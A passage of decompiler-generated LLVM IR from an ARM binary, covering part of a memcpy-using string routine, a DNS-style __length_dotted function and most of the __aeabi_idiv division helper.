dec_label_pc_19b50:                               ; preds = %bb28
  %v2_19b50 = add i32 %v6_19b9448, %storemerge17.ph58
  store i32 %v2_19b50, i32* %r6.global-to-local, align 4
  %v2_19b54 = load i32, i32* %stack_var_-40, align 4
  %v1_19b58 = add i32 %v2_19b50, 1
  store i32 %v1_19b58, i32* %r7.global-to-local, align 4
  %v3_19b5c = icmp ult i32 %v1_19b58, %v2_19b54
  br i1 %v3_19b5c, label %dec_label_pc_19b64, label %dec_label_pc_19bb4

dec_label_pc_19b64:                               ; preds = %dec_label_pc_19b50
  %v2_19b64 = add i32 %v1_19b28, %v0_19b30.ph59
  store i32 %v2_19b64, i32* @r1, align 4
  %v0_19b68 = load i32, i32* %sb.global-to-local, align 4
  %v2_19b68 = add i32 %v0_19b68, %storemerge17.ph58
  store i32 %v2_19b68, i32* @r0, align 4
  store i32 %v6_19b9448, i32* @r2, align 4
  %v0_19b70 = call i32 @memcpy()
  %v0_19b74 = load i32, i32* @r5, align 4
  %v1_19b74 = load i32, i32* @r4, align 4
  %v2_19b74 = add i32 %v1_19b74, %v0_19b74
  store i32 %v2_19b74, i32* %r1.global-to-local, align 4
  %v0_19b78 = load i32, i32* %sl.global-to-local, align 4
  %v2_19b78 = add i32 %v0_19b78, %v2_19b74
  %v3_19b78 = inttoptr i32 %v2_19b78 to i8*
  %v4_19b78 = load i8, i8* %v3_19b78, align 1
  %v0_19b7c = load i32, i32* %fp.global-to-local, align 4
  %v2_19b7c = icmp eq i32 %v0_19b7c, 0
  br i1 %v2_19b7c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_19b64
  %v1_19b80 = load i32, i32* %r8.global-to-local, align 4
  %v3_19b80 = add i32 %v1_19b80, %v1_19b74
  store i32 %v3_19b80, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_19b64, %bb31
  %v2_19b84 = icmp eq i8 %v4_19b78, 0
  br i1 %v2_19b84, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_19b8c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_19b8c = load i32, i32* %sb.global-to-local, align 4
  %v3_19b8c = load i32, i32* %r6.global-to-local, align 4
  %v4_19b8c = add i32 %v3_19b8c, %v2_19b8c
  %v5_19b8c = inttoptr i32 %v4_19b8c to i8*
  store i8 %v0_19b8c.off0, i8* %v5_19b8c, align 1
  %v0_19b90.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_19b94.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_19ba0.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_19b9439 = load i32, i32* %r1.global-to-local, align 4
  %v2_19b9440 = add i32 %v1_19b9439, %v0_19b94.pre.pre
  %v3_19b9441 = inttoptr i32 %v2_19b9440 to i8*
  %v4_19b9442 = load i8, i8* %v3_19b9441, align 1
  %v6_19b9443 = zext i8 %v4_19b9442 to i32
  store i32 %v6_19b9443, i32* @r4, align 4
  %v2_19b9844 = icmp eq i8 %v4_19b9442, 0
  %v2_19ba046 = icmp eq i32 %v0_19ba0.pre.pre, 0
  br i1 %v2_19b9844, label %dec_label_pc_19ba0, label %dec_label_pc_19b18.lr.ph

dec_label_pc_19b18.lr.ph:                         ; preds = %dec_label_pc_19b94.preheader, %bb34
  %v2_19ba04663 = phi i1 [ %v2_19ba046, %bb34 ], [ false, %dec_label_pc_19b94.preheader ]
  %v6_19b944361 = phi i32 [ %v6_19b9443, %bb34 ], [ %v6_19b944356, %dec_label_pc_19b94.preheader ]
  %v1_19b943960 = phi i32 [ %v1_19b9439, %bb34 ], [ %v1_19b943952, %dec_label_pc_19b94.preheader ]
  %v0_19b30.ph59 = phi i32 [ %v0_19b94.pre.pre, %bb34 ], [ %v0_19af4, %dec_label_pc_19b94.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_19b90.pre, %bb34 ], [ 0, %dec_label_pc_19b94.preheader ]
  br label %dec_label_pc_19b18

dec_label_pc_19ba0:                               ; preds = %bb34
  br i1 %v2_19ba046, label %dec_label_pc_19ba0.bb36_crit_edge, label %bb35

dec_label_pc_19ba0.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_19ba0
  %v0_19ba8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19bb4

bb35:                                             ; preds = %dec_label_pc_19b94.preheader, %dec_label_pc_19ba0
  %v1_19ba4 = load i32, i32* %r8.global-to-local, align 4
  %v2_19ba4 = add i32 %v1_19ba4, 1
  store i32 %v2_19ba4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19bb4

dec_label_pc_19bb4:                               ; preds = %dec_label_pc_19b50, %bb35, %dec_label_pc_19ba0.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_19ba8.pre, %dec_label_pc_19ba0.bb36_crit_edge ], [ %v2_19ba4, %bb35 ], [ -1, %dec_label_pc_19b50 ]
  store i32 %v3_19af0, i32* @r4, align 4
  store i32 %v6_19af0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_19b30.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_19b94, { 1, 0 }
  uselistorder i32 %v5_19b40, { 0, 2, 1 }
  uselistorder i32 %v6_19b9448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_19ba050, { 1, 0 }
  uselistorder i32 %v0_19af4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 2, 1, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 15, 14, 20, 13, 12, 11, 10, 2, 6, 5, 1, 0, 19, 9, 4, 3, 18, 21, 17, 16, 8, 7 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 14, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 21, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 22 }
  uselistorder i32* @r2, { 89, 90, 10, 91, 92, 93, 94, 11, 24, 25, 26, 95, 96, 97, 98, 12, 52, 99, 108, 109, 110, 111, 77, 13, 7, 144, 145, 146, 147, 53, 54, 3, 55, 56, 57, 101, 102, 8, 58, 15, 16, 148, 4, 149, 157, 158, 162, 150, 151, 152, 130, 38, 39, 40, 41, 42, 153, 132, 136, 137, 140, 138, 139, 133, 134, 135, 28, 74, 75, 1, 76, 129, 14, 112, 159, 78, 59, 60, 61, 100, 2, 160, 6, 161, 62, 63, 64, 65, 9, 66, 67, 5, 68, 0, 69, 103, 104, 105, 106, 70, 71, 107, 17, 18, 27, 154, 155, 156, 29, 30, 31, 32, 33, 34, 35, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 72, 73, 79, 80, 81, 82, 83, 84, 85, 86, 19, 20, 21, 22, 23, 87, 88, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 141, 142, 143 }
  uselistorder i32* @r5, { 175, 176, 177, 178, 179, 180, 181, 8, 182, 183, 184, 185, 186, 187, 188, 5, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 27, 38, 9, 3, 39, 205, 209, 206, 207, 208, 23, 214, 210, 211, 212, 213, 215, 216, 217, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 10, 93, 94, 218, 222, 11, 224, 223, 4, 225, 12, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 254, 253, 25, 255, 167, 168, 169, 170, 171, 172, 297, 298, 95, 96, 97, 98, 99, 100, 101, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 102, 103, 0, 104, 105, 106, 107, 108, 109, 311, 312, 313, 314, 1, 315, 316, 317, 158, 159, 160, 161, 162, 163, 40, 41, 42, 43, 44, 45, 46, 173, 13, 7, 174, 47, 48, 51, 52, 53, 54, 55, 56, 57, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 164, 165, 166, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 270, 271, 14, 272, 319, 320, 321, 322, 110, 15, 111, 112, 113, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 114, 16, 115, 116, 117, 118, 119, 17, 228, 229, 230, 18, 226, 227, 58, 59, 60, 231, 232, 233, 120, 121, 28, 122, 123, 19, 124, 125, 126, 127, 128, 129, 26, 130, 131, 132, 133, 29, 137, 20, 138, 139, 140, 141, 142, 143, 144, 145, 6, 146, 147, 148, 149, 150, 151, 36, 37, 134, 2, 135, 136, 21, 79, 80, 81, 50, 49, 24, 323, 324, 234, 235, 236, 237, 22, 238, 239, 152, 153, 154, 155, 156, 157, 219, 220, 221, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 318, 71, 72, 73, 74, 75, 76, 77, 78, 30, 31, 32, 33, 34, 35, 267, 268, 269 }
  uselistorder label %dec_label_pc_19bb4, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_19ba0.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19b18.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_19bc0 = load i32, i32* @r0, align 4
  store i32 %v0_19bc0, i32* @lr, align 4
  %v2_19bc0 = icmp eq i32 %v0_19bc0, 0
  br i1 %v2_19bc0, label %bb, label %dec_label_pc_19bd8

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19be0
  %v1_19bd0 = add i32 %v1_19be8, 2
  br label %dec_label_pc_19c00

dec_label_pc_19bd8:                               ; preds = %entry
  %v0_19bd8 = load i32, i32* @r1, align 4
  br label %dec_label_pc_19be8

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19be8
  %v1_19bf4 = and i32 %v6_19be8, 192
  %v2_19bf8 = add i32 %v6_19be8, %v1_19bec
  %v2_19be0 = icmp eq i32 %v1_19bf4, 192
  br i1 %v2_19be0, label %dec_label_pc_19bd0, label %dec_label_pc_19be8

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19be0, %dec_label_pc_19bd8
  %v1_19be8 = phi i32 [ %v2_19bf8, %dec_label_pc_19be0 ], [ %v0_19bd8, %dec_label_pc_19bd8 ]
  %v2_19be8 = add i32 %v1_19be8, %v0_19bc0
  %v3_19be8 = inttoptr i32 %v2_19be8 to i8*
  %v4_19be8 = load i8, i8* %v3_19be8, align 1
  %v6_19be8 = zext i8 %v4_19be8 to i32
  %v1_19bec = add i32 %v1_19be8, 1
  %v2_19bf0 = icmp eq i8 %v4_19be8, 0
  br i1 %v2_19bf0, label %dec_label_pc_19c00, label %dec_label_pc_19be0

dec_label_pc_19c00:                               ; preds = %dec_label_pc_19be8, %dec_label_pc_19bd0
  %v1_19c00 = phi i32 [ %v1_19bd0, %dec_label_pc_19bd0 ], [ %v1_19bec, %dec_label_pc_19be8 ]
  %v2_19c00 = sub i32 %v1_19c00, %v0_19bd8
  ret i32 %v2_19c00

; uselistorder directives
  uselistorder i32 %v6_19be8, { 1, 0 }
  uselistorder i32 %v1_19be8, { 2, 1, 0 }
  uselistorder i32 %v0_19bc0, { 0, 2, 1 }
  uselistorder i8 0, { 66, 17, 25, 26, 67, 16, 22, 68, 48, 72, 70, 47, 71, 69, 46, 40, 9, 10, 73, 74, 78, 79, 24, 62, 63, 75, 76, 77, 15, 80, 41, 49, 82, 0, 81, 50, 42, 83, 84, 85, 86, 87, 88, 11, 53, 92, 1, 90, 89, 51, 2, 91, 52, 3, 93, 94, 27, 4, 96, 95, 54, 97, 98, 99, 100, 43, 44, 102, 103, 101, 12, 13, 14, 104, 5, 28, 105, 18, 106, 107, 19, 64, 29, 30, 6, 108, 109, 110, 112, 113, 114, 115, 111, 45, 116, 117, 118, 119, 120, 20, 31, 32, 33, 34, 35, 121, 122, 36, 23, 7, 8, 124, 123, 37, 125, 126, 38, 127, 55, 21, 128, 129, 130, 131, 133, 56, 134, 135, 132, 136, 137, 138, 139, 141, 140, 142, 65, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 159, 158, 160, 57, 162, 161, 39, 163, 58, 164, 166, 167, 165, 59, 168, 169, 61, 170, 60, 171, 172, 173, 174, 175, 176, 177, 178 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32* @r1, { 109, 110, 1, 111, 112, 113, 116, 114, 115, 9, 10, 22, 117, 118, 119, 120, 121, 122, 123, 124, 3, 125, 126, 67, 127, 128, 129, 130, 133, 136, 137, 138, 139, 140, 141, 4, 98, 99, 12, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 6, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 5, 213, 214, 11, 131, 132, 68, 69, 70, 71, 72, 73, 74, 75, 76, 14, 19, 20, 215, 2, 216, 90, 91, 155, 32, 33, 218, 156, 161, 162, 165, 163, 164, 157, 158, 159, 160, 23, 217, 92, 15, 142, 148, 152, 151, 219, 220, 221, 77, 78, 79, 16, 153, 17, 80, 143, 144, 145, 146, 147, 7, 93, 94, 8, 13, 81, 82, 83, 0, 84, 85, 86, 18, 134, 135, 87, 88, 21, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 89, 95, 96, 97, 100, 101, 102, 103, 104, 105, 106, 107, 108, 149, 150, 154, 166 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_19c08 = icmp slt i32 %arg2, 0
  %v2_19c08 = icmp eq i32 %arg2, 0
  %v0_19c0c = load i32, i32* @r0, align 4
  %v2_19c0c = xor i32 %v0_19c0c, %arg2
  br i1 %v2_19c08, label %dec_label_pc_19d20, label %dec_label_pc_19c14

dec_label_pc_19c14:                               ; preds = %entry
  br i1 %v1_19c08, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_19c14
  %v2_19c14 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_19c14, %bb
  %v1_19ce0 = phi i32 [ %v2_19c14, %bb ], [ %arg2, %dec_label_pc_19c14 ]
  %v1_19c18 = add i32 %v1_19ce0, -1
  %v7_19c18 = icmp eq i32 %v1_19ce0, 1
  br i1 %v7_19c18, label %dec_label_pc_19cc0, label %dec_label_pc_19c20

dec_label_pc_19c20:                               ; preds = %thread-pre-split
  %v1_19c20 = icmp slt i32 %v0_19c0c, 0
  br i1 %v1_19c20, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_19c20
  %v2_19c24 = sub i32 0, %v0_19c0c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_19c20, %bb85
  %v0_19d14 = phi i32 [ %v0_19c0c, %dec_label_pc_19c20 ], [ %v2_19c24, %bb85 ]
  %v3_19c28 = icmp uge i32 %v0_19d14, %v1_19ce0
  %v9_19c28 = icmp eq i32 %v0_19d14, %v1_19ce0
  %v2_19c2c = xor i1 %v3_19c28, true
  %v3_19c2c = or i1 %v9_19c28, %v2_19c2c
  br i1 %v3_19c2c, label %dec_label_pc_19ccc, label %dec_label_pc_19c30

dec_label_pc_19c30:                               ; preds = %bb86
  %v2_19c30 = and i32 %v1_19c18, %v1_19ce0
  %v4_19c30 = icmp eq i32 %v2_19c30, 0
  br i1 %v4_19c30, label %dec_label_pc_19cdc, label %dec_label_pc_19c38

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c30
  %v3_19c38 = icmp ult i32 %v1_19ce0, 536870912
  br i1 %v3_19c38, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_19c38
  %v4_19c3c = mul i32 %v1_19ce0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_19c38, %.thread
  %v0_19c5c.pr40.ph = phi i32 [ %v4_19c3c, %.thread ], [ %v1_19ce0, %dec_label_pc_19c38 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_19c38 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_19c5c.pr40 = phi i32 [ %v4_19c50, %bb89 ], [ %v0_19c5c.pr40.ph, %.preheader.preheader ]
  %v1_19c54 = phi i32 [ %v4_19c54, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_19c48 = icmp ugt i32 %v0_19c5c.pr40, 268435455
  br i1 %v2_19c48, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_19c5cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_19c4c = icmp ult i32 %v0_19c5c.pr40, %v0_19d14
  br i1 %v4_19c4c, label %bb88, label %dec_label_pc_19c5cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_19c50 = and i32 %v0_19c5c.pr40, 268435456
  %v3_19c50 = icmp eq i32 %v2_19c50, 0
  %v4_19c50 = mul i32 %v0_19c5c.pr40, 16
  br i1 %v3_19c50, label %bb89, label %dec_label_pc_19c5c.loopexit

bb89:                                             ; preds = %bb88
  %v2_19c54 = and i32 %v1_19c54, 268435456
  %v3_19c54 = icmp eq i32 %v2_19c54, 0
  %v4_19c54 = mul i32 %v1_19c54, 16
  br i1 %v3_19c54, label %.preheader, label %dec_label_pc_19c5cthread-pre-split.loopexit.loopexit

dec_label_pc_19c5cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_19c6852.ph = phi i32 [ %v1_19c54, %bb87 ], [ %v4_19c54, %bb89 ]
  %v0_19c5c.pr42.ph = phi i32 [ %v0_19c5c.pr40, %bb87 ], [ %v4_19c50, %bb89 ]
  br label %dec_label_pc_19c5cthread-pre-split.loopexit

dec_label_pc_19c5cthread-pre-split.loopexit:      ; preds = %dec_label_pc_19c5cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_19c6852 = phi i32 [ %v1_19c54, %.thread3 ], [ %v1_19c6852.ph, %dec_label_pc_19c5cthread-pre-split.loopexit.loopexit ]
  %v0_19c5c.pr42 = phi i32 [ %v0_19c5c.pr40, %.thread3 ], [ %v0_19c5c.pr42.ph, %dec_label_pc_19c5cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_19c5cthread-pre-split

dec_label_pc_19c5cthread-pre-split:               ; preds = %dec_label_pc_19c5cthread-pre-split.loopexit, %bb91
  %v1_19c6850 = phi i32 [ %v1_19c6852, %dec_label_pc_19c5cthread-pre-split.loopexit ], [ %v3_19c68, %bb91 ]
  %v2_19c6048 = phi i32 [ %v0_19d14, %dec_label_pc_19c5cthread-pre-split.loopexit ], [ %v2_19c60, %bb91 ]
  %v0_19c5c.pr = phi i32 [ %v0_19c5c.pr42, %dec_label_pc_19c5cthread-pre-split.loopexit ], [ %v3_19c64, %bb91 ]
  br label %dec_label_pc_19c5c

dec_label_pc_19c5c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_19c5c

dec_label_pc_19c5c:                               ; preds = %dec_label_pc_19c5c.loopexit, %dec_label_pc_19c5cthread-pre-split
  %v1_19c68 = phi i32 [ %v1_19c6850, %dec_label_pc_19c5cthread-pre-split ], [ %v1_19c54, %dec_label_pc_19c5c.loopexit ]
  %v2_19c60 = phi i32 [ %v2_19c6048, %dec_label_pc_19c5cthread-pre-split ], [ %v0_19d14, %dec_label_pc_19c5c.loopexit ]
  %v1_19c64 = phi i32 [ %v0_19c5c.pr, %dec_label_pc_19c5cthread-pre-split ], [ %v4_19c50, %dec_label_pc_19c5c.loopexit ]
  %v2_19c5c = icmp slt i32 %v1_19c64, 0
  br i1 %v2_19c5c, label %dec_label_pc_19c70, label %bb90

bb90:                                             ; preds = %dec_label_pc_19c5c
  %v4_19c60 = icmp ult i32 %v1_19c64, %v2_19c60
  br i1 %v4_19c60, label %bb91, label %dec_label_pc_19c70

bb91:                                             ; preds = %bb90
  %v3_19c64 = mul i32 %v1_19c64, 2
  %v2_19c68 = icmp slt i32 %v1_19c68, 0
  %v3_19c68 = mul i32 %v1_19c68, 2
  br i1 %v2_19c68, label %dec_label_pc_19c70, label %dec_label_pc_19c5cthread-pre-split

dec_label_pc_19c70:                               ; preds = %bb90, %dec_label_pc_19c5c, %bb91
  %v2_19c7c63 = phi i32 [ %v3_19c68, %bb91 ], [ %v1_19c68, %bb90 ], [ %v1_19c68, %dec_label_pc_19c5c ]
  %v1_19c7455 = phi i32 [ %v3_19c64, %bb91 ], [ %v1_19c64, %bb90 ], [ %v1_19c64, %dec_label_pc_19c5c ]
  br label %dec_label_pc_19c74

dec_label_pc_19c74:                               ; preds = %.thread13, %dec_label_pc_19c70
  %v1_19ca8 = phi i32 [ %v4_19ca8, %.thread13 ], [ %v2_19c7c63, %dec_label_pc_19c70 ]
  %v1_19c7c = phi i32 [ %v1_19cb8, %.thread13 ], [ 0, %dec_label_pc_19c70 ]
  %v1_19cac = phi i32 [ %v4_19cac, %.thread13 ], [ %v1_19c7455, %dec_label_pc_19c70 ]
  %v1_19c78 = phi i32 [ %v0_19ca4, %.thread13 ], [ %v0_19d14, %dec_label_pc_19c70 ]
  %v3_19c74 = icmp ult i32 %v1_19c78, %v1_19cac
  br i1 %v3_19c74, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_19c74
  %v3_19c78 = sub i32 %v1_19c78, %v1_19cac
  %v3_19c7c = or i32 %v1_19c7c, %v1_19ca8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_19c74, %bb92
  %v1_19c84 = phi i32 [ %v1_19c78, %dec_label_pc_19c74 ], [ %v3_19c78, %bb92 ]
  %v1_19c88 = phi i32 [ %v1_19c7c, %dec_label_pc_19c74 ], [ %v3_19c7c, %bb92 ]
  %v4_19c80 = udiv i32 %v1_19cac, 2
  %v6_19c80 = icmp ult i32 %v1_19c84, %v4_19c80
  br i1 %v6_19c80, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_19c84 = urem i32 %v1_19cac, 2
  %v4_19c84 = icmp eq i32 %v3_19c84, 0
  %v6_19c84 = sub i32 %v1_19c84, %v4_19c80
  br i1 %v4_19c84, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_19c88 = udiv i32 %v1_19ca8, 2
  %v6_19c88 = or i32 %v1_19c88, %v5_19c88
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_19c90 = phi i32 [ %v6_19c84, %bb93 ], [ %v1_19c84, %.thread8 ], [ %v6_19c84, %bb94 ]
  %v1_19c94 = phi i32 [ %v1_19c88, %bb93 ], [ %v1_19c88, %.thread8 ], [ %v6_19c88, %bb94 ]
  %v4_19c8c = udiv i32 %v1_19cac, 4
  %v6_19c8c = icmp ult i32 %v1_19c90, %v4_19c8c
  br i1 %v6_19c8c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_19c90 = and i32 %v1_19cac, 2
  %v4_19c90 = icmp eq i32 %v3_19c90, 0
  %v6_19c90 = sub i32 %v1_19c90, %v4_19c8c
  br i1 %v4_19c90, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_19c94 = udiv i32 %v1_19ca8, 4
  %v6_19c94 = or i32 %v1_19c94, %v5_19c94
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_19c9c = phi i32 [ %v6_19c90, %bb95 ], [ %v1_19c90, %.thread9 ], [ %v6_19c90, %bb96 ]
  %v1_19ca0 = phi i32 [ %v1_19c94, %bb95 ], [ %v1_19c94, %.thread9 ], [ %v6_19c94, %bb96 ]
  %v4_19c98 = udiv i32 %v1_19cac, 8
  %v6_19c98 = icmp ult i32 %v1_19c9c, %v4_19c98
  br i1 %v6_19c98, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_19c9c = and i32 %v1_19cac, 4
  %v4_19c9c = icmp eq i32 %v3_19c9c, 0
  %v6_19c9c = sub i32 %v1_19c9c, %v4_19c98
  br i1 %v4_19c9c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_19ca0 = udiv i32 %v1_19ca8, 8
  %v6_19ca0 = or i32 %v1_19ca0, %v5_19ca0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_19cb8 = phi i32 [ %v1_19ca0, %bb97 ], [ %v1_19ca0, %.thread10 ], [ %v6_19ca0, %bb98 ]
  %v0_19ca4 = phi i32 [ %v6_19c9c, %bb97 ], [ %v1_19c9c, %.thread10 ], [ %v6_19c9c, %bb98 ]
  %v2_19ca4 = icmp eq i32 %v0_19ca4, 0
  br i1 %v2_19ca4, label %dec_label_pc_19cb4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_19ca8, 16
  br i1 %tmp, label %dec_label_pc_19cb4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_19ca8 = udiv i32 %v1_19ca8, 16
  %v4_19cac = udiv i32 %v1_19cac, 16
  br label %dec_label_pc_19c74

dec_label_pc_19cb4:                               ; preds = %thread-pre-split12, %bb99
  %v1_19cb4 = icmp slt i32 %v2_19c0c, 0
  br i1 %v1_19cb4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_19cb4
  %v2_19cb8 = sub i32 0, %v1_19cb8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_19cc0, %dec_label_pc_19cb4, %bb100
  %v1_19cbc = phi i32 [ %v1_19cb8, %dec_label_pc_19cb4 ], [ %v2_19cb8, %bb100 ], [ %v0_19c0c, %dec_label_pc_19cc0 ], [ %v2_19cc4, %bb101 ], [ %v1_19cd880, %bb103 ], [ %v2_19cd4, %bb104 ]
  ret i32 %v1_19cbc

dec_label_pc_19cc0:                               ; preds = %thread-pre-split
  br i1 %v1_19c08, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_19cc0
  %v2_19cc4 = sub i32 0, %v0_19c0c
  br label %.thread16

dec_label_pc_19ccc:                               ; preds = %bb86
  br i1 %v3_19c28, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_19ccc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_19ccc, %bb102
  %v1_19cd880 = phi i32 [ %v0_19c0c, %dec_label_pc_19ccc ], [ 0, %bb102 ]
  br i1 %v9_19c28, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_19cd0 = ashr i32 %v2_19c0c, 31
  %v2_19cd4 = or i32 %v4_19cd0, 1
  br label %.thread16

dec_label_pc_19cdc:                               ; preds = %dec_label_pc_19c30
  %v2_19cdc = icmp ugt i32 %v1_19ce0, 65535
  br i1 %v2_19cdc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_19cdc
  %v2_19ce0 = and i32 %v1_19ce0, 32768
  %v3_19ce0 = icmp eq i32 %v2_19ce0, 0
  %v4_19ce0 = udiv i32 %v1_19ce0, 65536
  br i1 %v3_19ce0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_19cdc
  %v0_19cec70 = phi i32 [ %v1_19ce0, %dec_label_pc_19cdc ], [ %v4_19ce0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_19cf0 = phi i32 [ %v0_19cec70, %.thread19 ], [ %v4_19ce0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_19cec = icmp ugt i32 %v1_19cf0, 255
  br i1 %v2_19cec, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_19cf0 = and i32 %v1_19cf0, 128
  %v3_19cf0 = icmp eq i32 %v2_19cf0, 0
  %v4_19cf0 = udiv i32 %v1_19cf0, 256
  br i1 %v3_19cf0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_19cf4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_19d00 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_19cf4, %bb108 ]
  %v1_19cfc = phi i32 [ %v1_19cf0, %bb106 ], [ %v4_19cf0, %bb107 ], [ %v4_19cf0, %bb108 ]
